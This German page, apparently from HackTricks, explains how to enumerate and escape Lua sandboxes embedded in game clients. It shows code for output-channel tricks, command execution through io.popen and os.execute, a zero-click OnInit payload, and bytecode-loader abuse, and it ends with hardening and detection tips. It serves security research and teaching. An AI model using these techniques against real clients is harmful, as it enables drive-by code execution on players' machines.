# Lua-sandboxes umgehen (eingebettete VMs, Game-Clients)

Diese Seite sammelt praktische Techniken, um in Anwendungen eingebettete Lua-"sandboxes" (insbesondere Game-Clients, Plugins oder In-App-Scripting-Engines) zu enumerieren und zu verlassen. Viele Engines stellen eine eingeschränkte Lua-Umgebung bereit, lassen jedoch leistungsfähige globale Variablen erreichbar, die beliebige command execution oder sogar native memory corruption ermöglichen, wenn Bytecode-Loader verfügbar sind.

Wichtige Ideen:
- Betrachte die VM als unbekannte Umgebung: Enumeriere _G und finde heraus, welche gefährlichen Primitives erreichbar sind.
- Wenn stdout/print blockiert ist, missbrauche jeden UI-/IPC-Kanal innerhalb der VM als Output-Sink, um Ergebnisse zu beobachten.
- Wenn io/os verfügbar ist, hast du oft direkte command execution (io.popen, os.execute).
- Wenn load/loadstring/loadfile verfügbar sind, kann das Ausführen von speziell erstelltem Lua-Bytecode in einigen Versionen die memory safety umgehen (≤5.1-Validatoren sind umgehbar; 5.2 hat den Validator entfernt) und fortgeschrittene Exploitation ermöglichen.

## Die sandboxed Umgebung enumerieren

- Gib die globale Umgebung aus, um erreichbare Tabellen/Funktionen zu inventarisieren:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Wenn kein `print()` verfügbar ist, können In-VM-Kanäle zweckentfremdet werden. Beispiel aus einer MMO-Housing-Script-VM, in der die Chat-Ausgabe erst nach einem Sound-Aufruf funktioniert; das Folgende erstellt eine zuverlässige Ausgabefunktion:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Verallgemeinere dieses Muster für dein Ziel: Jedes Textfeld, jeder Toast, jeder Logger oder jeder UI-Callback, der Strings akzeptiert, kann bei der Reconnaissance als stdout dienen.

## Direkte command execution, wenn io/os exponiert ist

Wenn die Sandbox weiterhin die Standardbibliotheken io oder os exponiert, hast du wahrscheinlich sofortige command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Hinweise:

- Die Ausführung erfolgt innerhalb des Client-Prozesses; viele Anti-Cheat-/Anti-Debugging-Schichten, die externe Debugger blockieren, verhindern keine Prozesserstellung innerhalb der VM.
- Prüfe außerdem: package.loadlib (Laden beliebiger DLLs/.so-Dateien), require mit nativen Modulen, die FFI von LuaJIT (falls vorhanden) und die debug library (kann die Berechtigungen innerhalb der VM erhöhen).

## Zero-click-Trigger über Auto-run-Callbacks

Wenn die Host-Anwendung Scripts an Clients überträgt und die VM Auto-run-Hooks bereitstellt (z. B. OnInit/OnLoad/OnEnter), platziere dort deine Payload für eine Drive-by-Kompromittierung, sobald das Script geladen wird:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Jeder gleichwertige Callback (OnLoad, OnEnter usw.) verallgemeinert diese Technik, wenn Scripts automatisch an den Client übertragen und dort ausgeführt werden.

## Gefährliche Primitives, nach denen während der Recon gesucht werden sollte

Bei der Aufzählung von _G sollte insbesondere nach Folgendem gesucht werden:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: Ausführen von Source oder Bytecode; unterstützt das Laden nicht vertrauenswürdigen Bytecodes.
- package, package.loadlib, require: Laden dynamischer Bibliotheken und Moduloberfläche.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo und Hooks.
- Nur LuaJIT: ffi.cdef, ffi.load zum direkten Aufrufen von native code.

Minimale Anwendungsbeispiele (falls erreichbar):

Lua's Loader-API hat sich zwischen den Versionen geändert: In Lua 5.1 liest `load` aus einer Reader-Funktion und `loadstring` aus einem String; Lua 5.2 akzeptiert `load` entweder einen String oder eine Reader-Funktion, und `loadstring` ist als entsprechendes Äquivalent veraltet.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optionale Eskalation: Missbrauch von Lua-Bytecode-Loadern

Wenn load/loadstring/loadfile erreichbar sind, io/os jedoch eingeschränkt sind, kann die Ausführung von manipuliertem Lua-Bytecode zu Speicherleaks und Memory-Corruption-Primitives führen. Wichtige Fakten:
- Lua ≤ 5.1 wurde mit einem Bytecode-Verifier ausgeliefert, der bekannte Bypasses aufweist.<sup>[[4]](#references)</sup>
- Lua 5.2 entfernte den Verifier vollständig (offizielle Haltung: Anwendungen sollten einfach vorkompilierte Chunks ablehnen), wodurch sich die Angriffsfläche vergrößert, wenn das Laden von Bytecode nicht verboten ist.<sup>[[2]](#references)[[3]](#references)</sup>
- Typischer Ablauf: Pointer über In-VM-Ausgabe leaken, Bytecode erstellen, um Type Confusions zu erzeugen (z. B. im Zusammenhang mit FORLOOP oder anderen Opcodes), und anschließend zu beliebigem Lesen/Schreiben oder zur Ausführung von nativem Code pivotieren.<sup>[[2]](#references)[[4]](#references)</sup>

Dieser Pfad ist Engine-/versionsspezifisch und erfordert RE. Siehe die Referenzen für detaillierte Analysen, Exploitation-Primitives und Beispiele für Gadgets in Spielen.

## Hinweise zur Erkennung und Härtung (für Defender)

- Serverseitig: User-Scripts ablehnen oder umschreiben; sichere APIs allowlisten; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug und ffi entfernen oder an leere Bindings binden.
- Clientseitig: Lua mit einer minimalen _ENV ausführen, das Laden von Bytecode verbieten, einen strikten Bytecode-Verifier oder Signaturprüfungen wieder einführen und die Prozesserstellung aus dem Client-Prozess blockieren.
- Telemetrie: Auf die Erstellung eines Child-Prozesses durch gameclient kurz nach dem Laden eines Scripts aufmerksam machen; dies mit UI-/Chat-/Script-Events korrelieren.

## References

- [1] [Dieses Haus ist verflucht: Eine zehn Jahre alte RCE im AION-Client (Lua-VM für Häuser)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Entschlüsselung der Lua-Sicherheitslücken in Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Diskussion über die Entfernung des Bytecode-Verifiers](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Lua-5.1-Bytecode ausnutzen (Gist mit Verifier-Bypasses/Notizen)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua-5.1-Referenzhandbuch](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua-5.2-Referenzhandbuch](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
